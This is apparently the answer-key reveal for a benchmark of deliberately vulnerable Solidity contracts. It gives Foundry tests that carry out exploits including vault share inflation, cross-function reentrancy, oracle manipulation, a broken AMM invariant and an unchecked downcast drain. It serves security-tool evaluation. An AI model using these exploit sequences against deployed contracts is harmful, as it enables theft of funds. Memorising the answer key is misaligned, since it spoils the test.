REVEAL 3 of 3 — the 12 Foundry test files. `forge test` → 23 passing (buggy cases prove the exploit; clean cases show the tempting attack fails). foundry.toml: solc 0.8.24, evm cancun, src="src", test="test", libs=["lib"] (forge-std). The four you missed are C04/C08/C10/C11 — their exact exploit sequences are below, which is where your bounded search couldn't reach (2^127 rate, 160-bit K multiply, loop past unroll, large time-warp).

```solidity
// test/C01.t.sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import "forge-std/Test.sol";
import "../src/C01.sol";
contract C01Test is Test {
    TokenC01 token; VaultC01 vault;
    address attacker = makeAddr("attacker"); address victim = makeAddr("victim");
    function setUp() public {
        token = new TokenC01("Wrapped Dollar", "WD");
        vault = new VaultC01(token);
        token.mint(attacker, 10_000e18 + 1); token.mint(victim, 10_000e18);
    }
    function test_exploit_firstDepositorInflation() public {
        vm.startPrank(attacker);
        token.approve(address(vault), type(uint256).max);
        vault.deposit(1, attacker);
        token.transfer(address(vault), 10_000e18);
        vm.stopPrank();
        vm.startPrank(victim);
        token.approve(address(vault), type(uint256).max);
        uint256 shares = vault.deposit(10_000e18, victim);
        vm.stopPrank();
        assertEq(shares, 0, "victim rounded down to zero shares");
        vm.prank(attacker); vault.redeem(1, attacker, attacker);
        assertEq(token.balanceOf(attacker), 20_000e18 + 1);
        assertEq(vault.balanceOf(victim), 0); assertEq(token.balanceOf(victim), 0);
    }
}
```

```solidity
// test/C03.t.sol  (cross-function reentrancy; bounded single reentrant move, not a drain loop)
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import "forge-std/Test.sol";
import "../src/C03.sol";
contract SecondAccountC03 {
    EthPoolC03 pool;
    constructor(EthPoolC03 _pool) { pool = _pool; }
    function cashOut() external { pool.withdrawAll(); payable(msg.sender).transfer(address(this).balance); }
    receive() external payable {}
}
contract ReenterC03 {
    EthPoolC03 pool; SecondAccountC03 second; bool moved;
    constructor(EthPoolC03 _pool) { pool = _pool; second = new SecondAccountC03(_pool); }
    function run() external payable { pool.deposit{value: msg.value}(); pool.withdrawAll(); }
    receive() external payable {
        if (!moved && msg.sender == address(pool)) {
            moved = true;
            pool.transfer(address(second), pool.balanceOf(address(this)));
        }
    }
    function finish() external { second.cashOut(); payable(msg.sender).transfer(address(this).balance); }
}
contract C03Test is Test {
    EthPoolC03 pool; address attacker = makeAddr("attacker");
    function setUp() public {
        pool = new EthPoolC03();
        for (uint256 i = 0; i < 3; i++) {
            address u = address(uint160(0x2000 + i));
            vm.deal(u, 1 ether); vm.prank(u); pool.deposit{value: 1 ether}();
        }
        vm.deal(attacker, 1 ether);
    }
    function test_exploit_crossFunctionReentrancy() public {
        vm.startPrank(attacker);
        ReenterC03 r = new ReenterC03(pool);
        r.run{value: 1 ether}(); r.finish();
        vm.stopPrank();
        assertEq(attacker.balance, 2 ether, "attacker doubled 1 ETH");
        assertEq(address(pool).balance, 2 ether, "pool short 1 ETH");
    }
}
```

```solidity
// test/C04.t.sol  (spot-oracle manipulation -> bad debt; YOU MISSED — loop past unroll)
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import "forge-std/Test.sol";
import "../src/C04.sol";
contract C04Test is Test {
    TokenC04 usds; TokenC04 gcol; AmmC04 amm; LendingC04 lending;
    address lender = makeAddr("lender"); address attacker = makeAddr("attacker");
    function setUp() public {
        usds = new TokenC04("USD Stable", "USDS"); gcol = new TokenC04("Gov Collateral", "GCOL");
        amm = new AmmC04(usds, gcol);
        usds.mint(address(this), 1_000e18); gcol.mint(address(this), 1_000e18);
        usds.approve(address(amm), type(uint256).max); gcol.approve(address(amm), type(uint256).max);
        amm.addLiquidity(1_000e18, 1_000e18);
        lending = new LendingC04(usds, gcol, amm);
        usds.mint(lender, 10_000e18);
        vm.startPrank(lender); usds.approve(address(lending), type(uint256).max); lending.supply(10_000e18); vm.stopPrank();
        gcol.mint(attacker, 100e18); usds.mint(attacker, 5_000e18);
    }
    function test_exploit_spotOracleManipulationBadDebt() public {
        vm.startPrank(attacker);
        gcol.approve(address(lending), type(uint256).max);
        usds.approve(address(amm), type(uint256).max); gcol.approve(address(amm), type(uint256).max);
        lending.depositCollateral(100e18);
        amm.swap(address(usds), 5_000e18, 0);          // pump GCOL spot price
        uint256 maxB = lending.maxBorrow(attacker);
        lending.borrow(maxB);
        vm.stopPrank();
        vm.startPrank(attacker); amm.swap(address(gcol), gcol.balanceOf(attacker), 0); vm.stopPrank(); // unwind
        assertGt(maxB, 200e18, "borrowed >> fair ~100");
        assertLt(lending.collateralValue(attacker), lending.debtOf(attacker), "position insolvent");
        assertGt(usds.balanceOf(attacker), 0);
    }
}
```

```solidity
// test/C06.t.sol  (my intended bug: missing _sync(to) bonus double-claim)
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import "forge-std/Test.sol";
import "../src/C06.sol";
contract C06Test is Test {
    TokenC06 base; TokenC06 bns; StakedShareC06 vault;
    address alice = makeAddr("alice"); address alt = makeAddr("alt"); address carol = makeAddr("carol");
    function setUp() public {
        base = new TokenC06("Base Asset", "BASE"); bns = new TokenC06("Bonus", "BNS");
        vault = new StakedShareC06(base, bns);
        base.mint(alice, 100e18); base.mint(carol, 100e18);
        vm.prank(alice); base.approve(address(vault), type(uint256).max);
        vm.prank(carol); base.approve(address(vault), type(uint256).max);
    }
    function test_exploit_transferDoubleClaimsBonus() public {
        vm.prank(alice); vault.deposit(100e18);
        vm.prank(carol); vault.deposit(100e18);
        bns.mint(address(this), 200e18); bns.approve(address(vault), type(uint256).max);
        vault.distribute(200e18);
        vm.prank(alice); vault.transfer(alt, 100e18);
        vm.prank(alice); uint256 a = vault.claimBonus();
        vm.prank(alt);   uint256 b = vault.claimBonus();
        assertEq(a, 100e18); assertEq(b, 100e18, "alt double-claims the same shares' bonus");
        vm.prank(carol); vm.expectRevert(bytes("balance")); vault.claimBonus();
    }
}
// (Your self-transfer finding is an additional, independent bug in the same _transfer — see reveal 2.)
```

```solidity
// test/C07.t.sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import "forge-std/Test.sol";
import "../src/C07.sol";
contract C07Test is Test {
    TokenC07 base; TokenC07 quote; OrderBookC07 book;
    address attacker = makeAddr("attacker"); address honest = makeAddr("honest");
    function setUp() public {
        base = new TokenC07("Base", "BASE"); quote = new TokenC07("Quote", "QUOTE");
        book = new OrderBookC07(base, quote);
        base.mint(attacker, 100e18); base.mint(honest, 100e18);
        vm.prank(attacker); base.approve(address(book), type(uint256).max);
        vm.prank(honest);   base.approve(address(book), type(uint256).max);
    }
    function test_exploit_cancelThenModifyDoubleRefund() public {
        vm.prank(honest); book.place(100e18, 1e18);
        vm.startPrank(attacker);
        uint256 id = book.place(100e18, 1e18);
        book.cancel(id);
        assertEq(base.balanceOf(attacker), 100e18, "first refund");
        book.modify(id, 1, 1e18);
        vm.stopPrank();
        assertApproxEqAbs(base.balanceOf(attacker), 200e18, 1, "second refund drained");
        vm.prank(honest); vm.expectRevert(bytes("balance")); book.cancel(1);
    }
}
```

```solidity
// test/C08.t.sol  (broken K scale; YOU MISSED — 160-bit circuit OOM)
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import "forge-std/Test.sol";
import "../src/C08.sol";
contract C08Test is Test {
    TokenC08 t0; TokenC08 t1; PairC08 pair;
    address lp = makeAddr("lp"); address attacker = makeAddr("attacker");
    function setUp() public {
        t0 = new TokenC08("Token A", "TKA"); t1 = new TokenC08("Token B", "TKB");
        pair = new PairC08(t0, t1);
        t0.mint(lp, 1_000e18); t1.mint(lp, 1_000e18);
        vm.startPrank(lp); t0.transfer(address(pair), 1_000e18); t1.transfer(address(pair), 1_000e18); pair.mint(lp); vm.stopPrank();
        t0.mint(attacker, 1e18);
    }
    function test_exploit_brokenKInvariantAllowsDrain() public {
        vm.startPrank(attacker);
        t0.transfer(address(pair), 1e18);     // pay in 1 token0
        pair.swap(0, 900e18, attacker);       // take out 900 token1 — K-check wrongly passes
        vm.stopPrank();
        assertEq(t1.balanceOf(attacker), 900e18);
        (uint112 r0, uint112 r1, ) = pair.getReserves();
        assertEq(r0, 1_001e18); assertEq(r1, 100e18);
    }
}
```

```solidity
// test/C10.t.sol  (rewardDebt stale on deposit; YOU MISSED — timed out)
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import "forge-std/Test.sol";
import "../src/C10.sol";
contract C10Test is Test {
    TokenC10 lp; TokenC10 frm; FarmC10 farm;
    address alice = makeAddr("alice"); address bob = makeAddr("bob");
    function setUp() public {
        lp = new TokenC10("LP Token", "LP"); frm = new TokenC10("Farm Reward", "FRM");
        farm = new FarmC10(lp, frm, 1e18);
        frm.mint(address(farm), 1_000_000e18);
        lp.mint(alice, 100e18); lp.mint(bob, 100e18);
        vm.prank(alice); lp.approve(address(farm), type(uint256).max);
        vm.prank(bob);   lp.approve(address(farm), type(uint256).max);
    }
    function test_exploit_lateDepositStealsAccruedRewards() public {
        vm.prank(alice); farm.deposit(100e18);
        vm.warp(block.timestamp + 100);                 // 100e18 accrues to alice
        vm.startPrank(bob); farm.deposit(100e18); farm.harvest(); vm.stopPrank();
        assertEq(frm.balanceOf(bob), 100e18, "bob harvested rewards for 0s staked");
        assertEq(farm.pendingReward(alice), 100e18, "alice still owed the same");
    }
}
```

```solidity
// test/C11.t.sol  (unchecked uint128 downcast; YOU MISSED — rate=(1<<127)+1, far outside 8-bit search)
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import "forge-std/Test.sol";
import "../src/C11.sol";
contract C11Test is Test {
    TokenC11 token; StreamPayC11 pay;
    address victim = makeAddr("victim"); address victimRecipient = makeAddr("victimRecipient"); address attacker = makeAddr("attacker");
    function setUp() public {
        token = new TokenC11("Payroll Dollar", "PUSD"); pay = new StreamPayC11(token);
        token.mint(victim, 1_000e18); token.mint(attacker, 2);
        vm.prank(victim);   token.approve(address(pay), type(uint256).max);
        vm.prank(attacker); token.approve(address(pay), type(uint256).max);
    }
    function test_exploit_depositDowncastDrainsContract() public {
        vm.prank(victim);
        pay.createStream(victimRecipient, 1e18, uint40(block.timestamp), uint40(block.timestamp + 1_000));
        assertEq(token.balanceOf(address(pay)), 1_000e18);
        uint256 rate = (uint256(1) << 127) + 1;         // *2 => 2^128+2, truncates to 2 on store
        vm.prank(attacker);
        uint256 id = pay.createStream(attacker, rate, uint40(block.timestamp), uint40(block.timestamp + 2));
        assertEq(token.balanceOf(address(pay)), 1_000e18 + 2, "attacker only paid 2 wei");
        vm.warp(block.timestamp + 3);
        vm.prank(attacker); pay.withdraw(id, uint128(1_000e18 + 2));
        assertEq(token.balanceOf(attacker), 1_000e18 + 2, "drained the contract");
        assertEq(token.balanceOf(address(pay)), 0);
        vm.warp(block.timestamp + 10);
        vm.prank(victimRecipient); vm.expectRevert(bytes("balance")); pay.withdraw(1, 1e18);
    }
}
```

Control tests (C02 Synthetix, C05 EIP-712, C09 virtual-share vault, C12 pull-payment auction) each assert the tempting attack reverts/earns nothing — they were sent in principle in GROUND_TRUTH.md; happy to paste the full C02/C05/C09/C12 test sources too if you want to replay the negatives. That closes the reveal: 8 buggy, 4 clean, and your engine's profile is clean/bounded (0 false positives, misses only outside its search bounds, plus one real bug you found that I hadn't planted). Good run — thanks for the rigor on the triage side.
